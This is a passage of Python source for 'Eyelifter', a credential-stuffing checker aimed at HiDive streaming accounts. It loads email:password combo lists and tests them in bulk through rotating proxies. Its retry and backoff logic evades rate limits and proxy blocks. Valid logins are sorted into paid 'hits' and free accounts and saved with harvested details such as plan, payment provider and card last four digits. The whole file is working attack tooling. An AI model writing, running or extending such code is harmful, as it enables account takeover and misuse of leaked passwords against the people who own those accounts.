        f"Licences = {s(u.get('active_licences'))}",
        f"by {AUTHOR_TAG}",
    ]

    return f"{prefix} {combo} | " + " | ".join(parts)


async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        else:
            if proxy and proxy in _eyelifter_bad:
                proxy = Eyelifter_pick_proxy()
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash", "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")

        if et == "proxy_block":
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(0.3)
            continue

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad(proxy)
            continue

        with _eyelifter_lock:
            _eyelifter_stats["retries"] += 1
        if proxy:
            Eyelifter_mark_bad(proxy)
        await asyncio.sleep(CONFIG.get("retry_delay", 2))

    return result or {"status": "error", "error_type": "no_result", "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
    total = _eyelifter_total
    st = result.get("status", "unknown")

    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        line = Eyelifter_fmt_line(combo, u)
        if st == "hit":
            with _eyelifter_lock:
                _eyelifter_stats["hits"] += 1
            print(f"\n[{done}/{total}] {line}\n")
            Eyelifter_safe_write(_eyelifter_hits_f, line + "\n\n")
        else:
            with _eyelifter_lock:
                _eyelifter_stats["free"] += 1
            Eyelifter_safe_write(_eyelifter_free_f, line + "\n\n")
    elif st == "bad":
        with _eyelifter_lock:
            _eyelifter_stats["bad"] += 1
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo} | invalid credentials\n")
    else:
        with _eyelifter_lock:
            _eyelifter_stats["errors"] += 1
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    sem = asyncio.Semaphore(CONFIG["threads"])
    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 2)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def one(combo):
        if _eyelifter_stop.is_set():
            return
        async with sem:
            if _eyelifter_stop.is_set():
                return
            async with ts_lock:
                now = time.time()
                delta = now - last_ts[0]
                if delta < gap:
                    await asyncio.sleep(gap - delta)
                last_ts[0] = time.time()

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}
            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {combo[:30]}: {e}", flush=True)

    tasks = [asyncio.create_task(one(c)) for c in combos]
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            t.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free"):
        u = result.get("user", {}) or {}
        verdict = "💎 SUBSCRIBER" if u.get("subscriber") else "🆓 FREE"
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Contact Email", u.get("contact_email", "-")),
            ("User ID", u.get("user_id", "-")),
            ("Profile ID", u.get("profile_id", "-")),
            ("Display Name", u.get("display_name", "-")),
            ("Profile Type", u.get("profile_type", "-")),
            ("Country", u.get("country", "-")),
            ("Account Created", u.get("account_created", "-")),
            ("Password Status", u.get("password_status", "-")),
            ("Pin Protection", u.get("pin_protection", "-")),
            ("Language", u.get("language", "-")),
            ("Preferred Locale", u.get("preferred_locale", "-")),
            ("Subscriber", str(u.get("subscriber")).lower()),
            ("Active Plan", u.get("active_plan", "-")),
            ("Active Plan ID", u.get("active_plan_id", "-")),
            ("Active Plan Type", u.get("active_plan_type", "-")),
            ("Account Status", u.get("account_status", "-")),
            ("Auto Renewal", u.get("auto_renew", "-")),
            ("Expiry Date", u.get("expiry_date", "-")),
            ("Days Left", u.get("days_left", "-")),
            ("Payment Provider", u.get("payment_provider", "-")),
            ("Card Last 4", u.get("card_last4", "-")),
            ("Price", u.get("price", "-")),
            ("Trial Period Days", u.get("trial_period_days", "-")),
            ("Active Licences", u.get("active_licences", "-")),
            ("Inactive Licences", u.get("inactive_licences", "-")),
            ("Licence Family", u.get("licence_family", "-")),
            ("Free Trial Eligible", u.get("has_free_trial_available", "-")),
            ("Payment Count", f"{u.get('payment_count', 0)} / {u.get('payment_total_results', 0)}"),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    else:
        st = result.get("status", "unknown")
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        if st == "bad":
            Eyelifter_log("❌", "ERROR", "RESULT", "invalid credentials")
        else:
            Eyelifter_log("❌", "ERROR", "RESULT", f"{st} [{et}] – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f
    global _eyelifter_err_f, _eyelifter_folder, _eyelifter_pool, _eyelifter_bad
    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = sorted(Eyelifter_extract_combos(content))
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "hidive_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "hidive_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "hidive_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "hidive_errors.txt"), "w", encoding="utf-8")

    header = (f"# HiDive Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
    else:
        working = []
    _eyelifter_pool = working
    _eyelifter_bad = set()

    _eyelifter_stop.clear()
    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")

    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        try:
            fh.close()
        except Exception:
            pass

    for base, key in (
        ("hidive_hits.txt", "hits"), ("hidive_free.txt", "free"),
        ("hidive_bad.txt", "bad"), ("hidive_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")

    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Subscribers (paid)", _eyelifter_stats["hits"]),
        ("Free accounts", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  Threads: {CONFIG['threads']}")
    print(f"  Timeout: {CONFIG['timeout']}s")
    print(f"  Retries: {CONFIG['retries']}")
    print(f"  Retry Delay: {CONFIG['retry_delay']}s")
    print(f"  Combo Delay: {CONFIG['combo_delay']}s")
    print(f"  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  Proxy File: {CONFIG['proxies_file']}")
    print(f"  Skip Proxy Test: {CONFIG['skip_proxy_test']}")
    print(f"  Debug: {CONFIG['debug']}")
    print(f"  UA Pool: {len(UA_POOL)} profiles")
    print()
    print("[1] Threads (1-20)")
    print("[2] Timeout")
    print("[3] Retries")
    print("[4] Retry Delay")
    print("[5] Combo Delay")
    print("[6] Toggle Debug")
    print("[7] Toggle Skip Proxy Test")
    print("[8] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    if ch == "1":
        try:
            v = int(input("Threads (1-20): "))
            CONFIG["threads"] = max(1, min(20, v))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "2":
        try:
            v = int(input("Timeout: "))
            CONFIG["timeout"] = max(10, min(120, v))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]
            changed = True
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "3":
        try:
            v = int(input("Retries (0-5): "))
            CONFIG["retries"] = max(0, min(5, v))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "4":
        try:
            v = float(input("Retry delay (s): "))
            CONFIG["retry_delay"] = max(0.0, v)
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "5":
        try:
            v = float(input("Combo delay (s): "))
            CONFIG["combo_delay"] = max(0.0, v)
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
    elif ch == "6":
        CONFIG["debug"] = not CONFIG["debug"]
        _loader.settings["debug"] = CONFIG["debug"]
        DEBUG = CONFIG["debug"]
        changed = True
    elif ch == "7":
        CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
        _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]
        changed = True

    if changed:
        RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
        MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    pass  # disabled in bot
    Eyelifter_banner(TOOL_NAME, "HiDive Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies - direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)